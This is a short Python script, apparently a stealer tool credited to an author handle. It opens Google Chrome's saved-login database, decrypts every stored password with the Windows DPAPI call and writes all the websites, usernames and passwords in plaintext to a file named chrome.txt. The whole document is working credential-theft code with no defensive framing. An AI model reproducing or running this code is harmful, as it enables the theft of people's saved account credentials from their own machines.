#Author:D4Vinci
import os,sqlite3,win32crypt
data=os.path.expanduser('~')+"\AppData\Local\Google\Chrome\User Data\Default\Login Data"
connection = sqlite3.connect(data)
print "[>]Connected to data base.."
cursor = connection.cursor()
cursor.execute('SELECT action_url, username_value, password_value FROM logins')
final_data=cursor.fetchall()
print "[>]Found "+str(len(final_data))+" password.."
a=open("chrome.txt","w")
a.write("Extracted chrome passwords :\n")
for website_data in final_data:
    password = win32crypt.CryptUnprotectData(website_data[2], None, None, None, 0)[1]
    one="Website  : "+str(website_data[0])
    two="Username : "+str(website_data[1])
    three="Password : "+str(password)
    a.write(one+"\n"+two+"\n"+three)
    a.write("\n"+" == ==="*10+"\n")
print "[>]Decrypted "+str(len(final_data))+" passwords.."
print "[>]Data written to chrome.txt"
